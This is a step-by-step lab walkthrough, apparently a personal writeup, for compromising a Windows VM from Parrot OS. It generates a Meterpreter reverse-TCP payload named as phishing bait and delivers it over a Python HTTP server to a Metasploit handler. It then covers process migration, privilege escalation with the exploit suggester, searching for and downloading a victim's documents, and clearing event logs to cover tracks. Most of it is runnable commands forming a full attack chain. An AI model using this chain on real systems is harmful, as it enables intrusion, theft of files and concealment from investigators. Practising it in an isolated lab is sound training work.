## Step 1: Lab Network Setup

- VirtualBox: Both Parrot OS and Windows VM set to `Host-only Adapter`
- Parrot IP: 192.168.XX.X
- Windows IP: 192.168.XX.X
- Ping test: Successful (Parrot can reach Windows)


### Network Configuration (VirtualBox)
1. Go to **File > Host Network Manager**, create `vboxnet0`.
2. Assign the following:
   - parrot os: `192.168.XX.X`
   - Windows 10: `192.168.XX.X`
3. Ensure both VMs are using **Host-Only Adapter** mode.

### Test Connectivity:
```bash
ping 192.168.XX.X   # From parrotOS

##
### Step 2: Payload Creation

Generate Meterpreter Payload:
mkdir payloads && cd payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.XX.X LPORT=4444 -f exe -o phishing_payload.exe

## Step 3: HTTP Server for Delivery
Host Payload with Python:
python3 -m http.server 8080

On Windows Target:
Download the payload via browser:
http://192.168.XX.X:8080/phishing_payload.exe

##Step 4: Metasploit Handler
Start Metasploit:
msfconsole

Set Up Listener:
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.XX.X
set LPORT 4444
run -j


##Step 5: Initial Access & Meterpreter Shell
Once payload is executed from Windows:
sessions
sessions -i [ID]
getuid
sysinfo



## Step 6: Privilege Escalation
Migrate to Stable Process:
ps
migrate [PID]

Use Exploit Suggester:
background
use post/multi/recon/local_exploit_suggester
set SESSION [ID]
run

After successful privesc, confirm with:
getuid

##Step 7: File Search & Exfiltration
search -f *.docx

Download Files:
download C:\\Users\\Victim\\Documents\\secret.docx


##Step 8: Covering Tracks
Clear Windows Event Logs:
clearev

Delete Payload:
rm C:\\Users\\Victim\\Downloads\\phishing_payload.exe

